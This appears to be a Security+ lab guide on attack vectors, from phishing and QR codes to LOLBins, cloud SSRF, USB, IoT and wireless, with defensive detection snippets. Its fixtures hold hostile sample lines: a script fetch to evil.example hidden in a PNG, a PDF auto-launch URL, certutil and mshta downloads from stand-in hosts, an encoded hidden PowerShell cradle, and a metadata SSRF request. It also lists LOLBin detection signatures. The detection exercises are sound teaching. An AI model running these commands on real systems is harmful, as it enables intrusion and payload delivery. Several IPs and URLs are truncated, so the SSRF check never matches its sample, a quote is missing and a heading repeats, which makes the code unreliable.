# CompTIA Security+ (SY0-701) – Practical Lab Guide
## Domain 2: Threats, Vulnerabilities, and Mitigations
### Objective 2.3: Threat Vectors and Attack Surfaces

> **Objective:** Identify, analyze, and detect attack vectors across messaging platforms, malicious files, web browsers, network/cloud/virtual infrastructure, supply chains, physical media, and wireless/RF interfaces.  
> **Recommended Lab Tools:** Python 3, Linux Terminal / Bash, Windows PowerShell, `exiftool` / `strings`, `openssl`, `nmap`.

---

## Part A: Messaging, Social Engineering & Web Delivery Vectors

### 1. Email Attacks (Phishing, Spear Phishing, Whaling, BEC)
* **Concept:** Deceptive emails used to harvest credentials, deliver malware attachments, or trigger fraudulent wire transfers (Business Email Compromise). Defended by **SPF**, **DKIM**, and **DMARC**.
* **Practical Task (Audit Email Authentication Headers in Python):**
  ```python
  email_headers = """
  From: CEO <ceo@corp-domain.com>
  Return-Path: <bounce@attacker-mailer.xyz>
  Authentication-Results: spf=fail (sender IP not permitted); dkim=none; dmarc=fail
  """

  if "spf=fail" in email_headers or "dmarc=fail" in email_headers:
      print("[EMAIL SPOOFING ALERT] SPF/DMARC validation failed! Quarantine message.")
  ```

### 2. SMS Attacks (Smishing) & 3. Rich Communication Services (RCS)
* **Concept:**
  * **Smishing (SMS Phishing):** Fraudulent text messages with shortened malicious links (`bit.ly`) impersonating banks, delivery couriers, or MFA prompts.
  * **RCS Attacks:** RCS upgrades SMS with rich media, verified business branding, read receipts, and interactive buttons—which attackers abuse to craft highly convincing fake brand messages and malicious link cards.
* **Practical Task (Detect URL Shorteners & Homograph Lookalike Domains in Python):**
  ```python
  sms_link = "https://paypa1-security-verify.com"
  shorteners = ("bit.ly", "tinyurl.com", "t.co")

  if any(s in sms_link for s in shorteners) or "paypa1" in sms_link:
      print(f"[SMISHING/RCS ALERT] Suspicious or typosquatted URL detected: {sms_link}")
  ```

### 4. Instant Messaging & 5. Collaboration Tools
* **Concept:** Attackers compromise or infiltrate Slack, Microsoft Teams, Discord, or WhatsApp channels to impersonate IT support, push malicious links, or abuse external tenant federation to bypass email filters.
* **Practical Task (Verify Collaboration Security Controls):**
  1. Audit external guest access settings: restrict external federation to explicitly allow-listed partner domains and disable automatic file execution in chat clients.

### 6. QR Code Attacks (Quishing)
* **Concept:** Embedding malicious URLs inside QR codes on phishing emails, PDFs, or physical parking meters/posters—bypassing text-based email link scanners and forcing users onto unmanaged personal smartphones.
* **Practical Task (Inspect/Decode a QR Payload Safely Without Opening the Link):**
  ```python
  # Always extract and inspect the raw URL string from a QR code before visiting it
  decoded_qr_url = "http://198.51.100"
  if decoded_qr_url.startswith("http://") or any(c.isdigit() for c in decoded_qr_url.split("/")[2].split(".")):
      print(f"[QUISHING WARNING] QR code points to unencrypted or raw IP host: {decoded_qr_url}")
  ```

### 7. Image-Based Attacks & 8. Embedded Malicious Content
* **Concept:** Hiding malicious payloads, phishing links, or C2 instructions inside image files (PNG/JPEG/SVG) via **steganography**, malicious SVG `<script>` tags, or polyglot files.
* **Practical Task (Inspect Image Metadata & Embedded Strings for Hidden Payloads):**
  ```bash
  printf "\x89PNG\r\n\x1a\nNormalImageBytes" > promo.png
  echo "<script>fetch('http://evil.example)</script>" >> promo.png
  strings promo.png | grep -iE "script|http|eval"
  ```

### 9. CAPTCHA Abuse
* **Concept:** Fake CAPTCHA pages ("Click Allow to prove you are not a robot" or "Press Win+R and Ctrl+V to verify human") that trick users into enabling malicious browser push notifications or executing clipboard-injected PowerShell malware (**ClickFix** attacks).
* **Practical Task (Detect Clipboard-to-PowerShell Execution Patterns):**
  1. Monitor endpoint logs for `explorer.exe` spawning `powershell.exe` or `mshta.exe` directly via the Windows Run dialog (`Win+R`).

---

## Part B: Malicious Files, Documents & Browser Vectors

### 10. Malicious Document Attachments, 11. Macros, 12. RTF & 13. PDF Attacks
* **Concept:**
  * **Macros (`.docm`, `.xlsm`):** Embedded VBA scripts inside Office documents that execute arbitrary PowerShell/shell commands when a user clicks *"Enable Content"*.
  * **RTF Documents (`.rtf`):** Rich Text Format files frequently used to embed OLE exploits (e.g., Equation Editor flaws) without needing macros.
  * **PDF Attacks:** Exploits utilizing embedded JavaScript (`/JS`, `/JavaScript`), automatic open actions (`/OpenAction`), or malicious embedded links.
* **Practical Task (Static Triage of Suspicious PDF & Office Keywords in Python):**
  ```python
  simulated_pdf_bytes = b"%PDF-1.7 /Type /Catalog /OpenAction << /S /JavaScript /JS (app.launchURL('http://evil.local')) >>"
  suspicious_tags = [b"/JavaScript", b"/JS", b"/OpenAction", b"/Launch", b"/EmbeddedFile"]

  found = [tag.decode() for tag in suspicious_tags if tag in simulated_pdf_bytes]
  if found:
      print("[MALICIOUS PDF INDICATORS] Suspicious PDF action tags found:", ", ".join(found))
  ```

### 14. Browser Extensions & 15. JavaScript
* **Concept:**
  * **Browser Extensions:** Over-privileged or rogue extensions requesting `"Read and change all your data on all websites"` can steal session cookies, inject ads, or log keystrokes.
  * **JavaScript:** Used in **Cross-Site Scripting (XSS)**, **Drive-by Downloads**, and malicious browser redirects.
* **Practical Task (Audit Installed Browser Extensions via CLI):**
  * **Linux (Chrome/Chromium extension IDs):** `ls -la ~/.config/google-chrome/Default/Extensions/ 2>/dev/null || echo "Check browser extensions"`
  * **Windows (PowerShell):** `Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Extensions" -ErrorAction SilentlyContinue`

### 16. Password Manager Threats
* **Concept:** Targeting local password vault databases (master password brute-forcing, memory scraping while unlocked), malicious browser autofill overlays, or compromising cloud vault sync servers.
* **Practical Task:**
  1. Verify vault security controls: enforce **auto-lock timeout** (e.g., 5 minutes), **clip-board auto-clear**, and **FIDO2/hardware MFA** on cloud password managers.

### 17. Cookies & 18. Session Tokens
* **Concept:** After authentication, web apps issue session cookies or bearer tokens (JWTs). Attackers steal them via **XSS**, **unencrypted HTTP sniffing**, or **infostealer malware** to perform **Session Hijacking (Pass-the-Cookie)**—bypassing both passwords and MFA!
* **Practical Task (Audit Cookie Security Flags `HttpOnly`, `Secure`, `SameSite` in Python):**
  ```python
  set_cookie_header = "session_id=xyz987abc; Path=/; Secure; HttpOnly; SameSite=Strict"

  required_flags = ["Secure", "HttpOnly", "SameSite"]
  missing = [flag for flag in required_flags if flag.lower() not in set_cookie_header.lower()]
  print("Missing Cookie Protections:", missing if missing else "NONE (Hardened Session Cookie)")
  ```

---

## Part C: Infrastructure, Remote Access, Cloud & Endpoint Vectors

### 19. Network Infrastructure Attacks
* **Concept:** Targeting routers, switches, firewalls, and DNS servers via default credentials, unpatched firmware, **ARP spoofing**, **VLAN hopping**, **BGP hijacking**, or **DNS poisoning**.
* **Practical Task:**
  1. Check for duplicate MAC addresses in your local ARP table (indicator of ARP spoofing):
     ```bash
     arp -a
     ```

### 20. Virtualized Infrastructure Attacks
* **Concept:** Targeting hypervisors (ESXi ransomware), VM management consoles (vCenter), **VM Escape**, or container daemon sockets (`/var/run/docker.sock`).
* **Practical Task:**
  1. Verify hypervisor management interfaces are isolated on a dedicated management VLAN and never exposed to the public Internet.

### 21. Remote Desktop (RDP), 22. VNC & 23. VPN Attacks
* **Concept:**
  * **RDP (`TCP/3389`) & VNC (`TCP/5900`):** Prime targets for credential brute-forcing, credential stuffing, and BlueKeep-style exploits when exposed directly to the Internet.
  * **VPN Attacks:** Exploiting unpatched SSL/TLS VPN appliances or spraying stolen credentials against VPN portals lacking MFA.
* **Practical Task (Audit Host for Exposed RDP/VNC Ports):**
  ```bash
  ss -tuln | grep -E ":3389|:5900" || echo "[PASS] RDP (3389) and VNC (5900) are not listening publicly."
  ```

### 24. Mobile Device, 25. Workstation & 26. Server Attacks
* **Concept:**
  * **Mobile:** Malicious side-loaded apps (`.apk`), jailbreaking/rooting, rogue MDM profiles, SMS/RCS phishing.
  * **Workstations:** Initial foothold via phishing, malicious USBs, browser exploits, and local privilege escalation.
  * **Servers:** High-value targets attacked via unpatched web apps, exposed databases, and lateral movement.

### 27. Living-off-the-Land (LotL) Techniques
### 27. Living-off-the-Land (LotL) Techniques
* **Concept:** Attackers abuse legitimate, pre-installed operating system administrative tools (**LOLBins** on Windows like `powershell.exe`, `certutil.exe`, `mshta.exe`, `wmic.exe`, `bitsadmin.exe`; **GTFOBins** on Linux like `curl`, `wget`, `python3`, `bash`) to execute payloads, download second-stage implants, and move laterally without dropping custom `.exe` binaries on disk—bypassing traditional signature-based antivirus.
* **Practical Task (Build a SIEM Command-Line Detection Rule for LOLBin Abuse in Python):**
  ```python
  process_creation_logs = [
      "svchost.exe -k netsvcs",
      "certutil.exe -urlcache -split -f http://198.51.100 C:\\Users\\Public\\s2.dll",
      "mshta.exe http://198.51.100",
      "powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"
  ]

  lolbin_signatures = ["certutil.exe -urlcache", "mshta.exe http", "powershell.exe -nop", "-enc "]

  for cmd in process_creation_logs:
      if any(sig in cmd.lower() for sig in lolbin_signatures):
          print(f"[LOTL BEHAVIORAL ALERT] Suspicious built-in binary execution:\n  -> {cmd}")
  ```

---

### 28. Cloud-Based Attacks
* **Concept:** Attack vectors targeting cloud infrastructure (AWS, Azure, GCP):
  * **Public Storage Exposure:** Misconfigured S3 buckets or Azure Blob containers allowing anonymous public `List`/`Read`.
  * **SSRF to Cloud Metadata Service:** Exploiting a vulnerable web app to query `http://169.254.169` and steal temporary IAM role tokens (mitigated by enforcing **IMDSv2**).
  * **Leaked Cloud API Keys / OAuth Token Theft:** Hardcoded `AKIA...` access keys committed to public GitHub repositories.
* **Practical Task (Detect Leaked Cloud API Keys & Metadata SSRF Payloads in Python):**
  ```python
  import re

  web_request_log = 'GET /proxy?url=http://169.254.169 HTTP/1.1'
  code_snippet = 'aws_access_key_id = "AKIAIOSFODNN7EXAMPLE"'

  if "169.254.169.254" in web_request_log:
      print("[CLOUD SSRF ALERT] Attempt to query Cloud Instance Metadata IP detected!")

  if re.search(r"AKIA[0-9A-Z]{16}", code_snippet):
      print("[CLOUD IAM LEAK] Hardcoded AWS Access Key ID detected in source code!")
  ```

---

## Part D: Supply Chain, Third-Party & Physical/Wireless Vectors

### 29. Supply Chain, 30. Third-Party Providers, 31. MSPs & 32. SaaS Providers
* **Concept:**
  * **Supply Chain Attacks:** Compromising a trusted vendor's software build pipeline, open-source library (`PyPI`, `npm`), or hardware firmware before distribution so customers install trojanized updates (e.g., SolarWinds SUNBURST).
  * **Third-Party Providers & MSPs (Managed Service Providers):** Attackers breach an IT vendor or MSP holding trusted RMM (Remote Monitoring and Management) or site-to-site VPN access, then pivot simultaneously into dozens of client networks.
  * **SaaS Providers:** Attackers compromise a cloud SaaS vendor or abuse malicious third-party **OAuth app integrations** to read corporate emails and cloud drives without needing user passwords.
* **Practical Task (Verify Vendor Software Integrity & Check Dependency Lockfiles):**
  ```bash
  # Always verify vendor-published SHA-256 checksums before installing updates
  echo "official_signed_binary_v2.4" > release_v2.4.bin
  sha256sum release_v2.4.bin > release_v2.4.bin.sha256

  # Verify integrity before execution
  sha256sum -c release_v2.4.bin.sha256
  ```

---

### 33. Malicious USB Devices
* **Concept:** Unverified USB drives left in parking lots/lobbies or specialized **BadUSB / USB Rubber Ducky** hardware implants that spoof a **USB HID (Keyboard)** descriptor—injecting automated commands at 1,000+ words per minute as soon as plugged in.
* **Practical Task (Audit Connected USB Devices & Check USB Device Control Policies):**
  * **Linux:**
    ```bash
    lsusb
    # Inspect recent USB kernel connection logs (shows HID Keyboard vs. Mass Storage):
    dmesg | grep -iE "usb|hid" | tail -n 10
    ```
  * **Windows (PowerShell):**
    ```powershell
    Get-PnpDevice -Class USB | Select-Object Status, Class, FriendlyName
    ```

---

### 34. Impersonation & 35. Contractor and Visitor Threats
* **Concept:**
  * **Impersonation:** Attackers posing as IT support, executives, or delivery technicians (via phone/vishing, chat, or on-site) to trick staff into resetting MFA or granting access.
  * **Contractor & Visitor Threats:** Unescorted visitors plugging rogue access points or drop-boxes into live Ethernet wall ports (**tailgating/piggybacking**), or external contractors retaining active VPN/IAM accounts after contract termination.
* **Practical Task (Audit Stale / Expired Contractor Accounts in Python):**
  ```python
  from datetime import datetime

  contractor_accounts = [
      {"user": "ext_contractor_01", "contract_end": "2026-10-15", "account_enabled": True},
      {"user": "ext_contractor_02", "contract_end": "2027-03-01", "account_enabled": True}
  ]

  today = datetime.now().strftime("%Y-%m-%d")
  for acct in contractor_accounts:
      if acct["contract_end"] < today and acct["account_enabled"]:
          print(f"[ACCESS GOVERNANCE VIOLATION] Expired contractor '{acct['user']}' still enabled! Disable immediately.")
  ```

---

### 36. Watering-Hole Attacks
* **Concept:** Instead of attacking a hardened enterprise directly, an attacker profiles which third-party websites the target employees frequently visit (e.g., an industry association portal, regional forum, or vendor support site), compromises that trusted website, and injects a malicious redirect/exploit kit targeting visitors.
* **Practical Task:**
  1. **Defense Simulation:** Verify DNS filtering / web proxy logging is enabled to alert on unexpected outbound connections to newly registered domains (`NRDs`) triggered immediately after visiting trusted industry websites.

---

### 37. IoT Attacks & 38. Operational Technology (OT) Attacks
* **Concept:**
  * **IoT (Internet of Things) Attacks:** Compromising smart cameras, IP phones, printers, or smart thermostats running default passwords and unpatchable firmware to form DDoS botnets (e.g., Mirai) or act as pivot points into internal networks.
  * **OT (Operational Technology) / ICS / SCADA Attacks:** Targeting industrial programmable logic controllers (**PLCs**), power substations, water plants, and factory robotics where physical safety and uptime are critical. *(Mitigated by air-gapping, unidirectional security gateways/data diodes, and strict IT/OT firewall segmentation).*
* **Practical Task (Scan a Lab Subnet for Exposed IoT/OT Default Management Ports):**
  ```bash
  # Check localhost for common unencrypted IoT/OT ports (Telnet 23, HTTP 80, Modbus 502)
  ss -tuln | grep -E ":23 |:80 |:502 " || echo "[PASS] No legacy IoT/OT ports exposed."
  ```

---

### 39. Physical Attacks
* **Concept:** Direct physical compromise of facilities or hardware:
  * **Tailgating / Piggybacking:** Following an authorized employee through a badge-controlled door.
  * **Shoulder Surfing & Dumpster Diving:** Observing PINs/screens over someone's shoulder or retrieving unshredded sensitive documents from trash bins.
  * **Hardware Keyloggers & Evil Maid Attacks:** Attaching a physical inline USB/PS2 keylogger or booting an unattended laptop from a malicious live USB to tamper with an unencrypted bootloader/OS.
* **Practical Task:**
  1. Verify physical BIOS/UEFI protections on your lab machine: ensure **Secure Boot** is enabled, USB boot priority is disabled, and a **BIOS/UEFI administrator password** is set to defeat Evil Maid attacks.

---

### 40. Bluetooth, 41. Radio Frequency (RF) & 42. NFC Attacks
* **Concept:**
  * **Bluetooth Attacks:**
    * **Bluejacking:** Sending unsolicited messages/vCards over Bluetooth (annoying, low risk).
    * **Bluesnarfing:** Unauthorized theft of contacts, messages, or files via Bluetooth vulnerabilities (high confidentiality risk).
    * **Bluebugging:** Taking complete remote command-and-control over a victim's phone/device via Bluetooth.
  * **Radio Frequency (RF) Attacks:**
    * **RF Jamming:** Flooding wireless frequencies (`2.4 GHz` / `5 GHz` / cellular) with noise to cause a physical layer Denial of Service (DoS).
    * **Replay Attacks:** Capturing wireless RF signals (e.g., key fobs, garage openers) with Software-Defined Radio (SDR) and retransmitting them later.
  * **NFC (Near-Field Communication) Attacks:** Short-range (`<4 cm`) eavesdropping, skimming contactless smartcards/badges, or planting malicious NFC tags that force smartphones to open phishing URLs.
* **Practical Task (Audit & Disable Unused Wireless/Bluetooth Radios):**
  * **Linux:**
    ```bash
    rfkill list
    # Disable Bluetooth radio when not actively needed:
    # sudo rfkill block bluetooth
    ```
  * **Windows (PowerShell):**
    ```powershell
    Get-PnpDevice -Class Bluetooth | Select-Object Status, FriendlyName
    ```

---

### Objective 2.3 Completion Checklist
- [ ] Built Python detection rules for **Living-off-the-Land (LOLBins)** and **Cloud Metadata SSRF / leaked IAM keys**.
- [ ] Verified software package integrity with **SHA-256 checksums** (`sha256sum -c`) to mitigate **Supply Chain** tampering.
- [ ] Audited connected **USB devices** (`lsusb` / `Get-PnpDevice`) and built an expired **contractor account** governance check.
- [ ] Verified local **IoT/OT port exposure** (`23`, `502`) and audited **Bluetooth/RF** radio states (`rfkill list`).

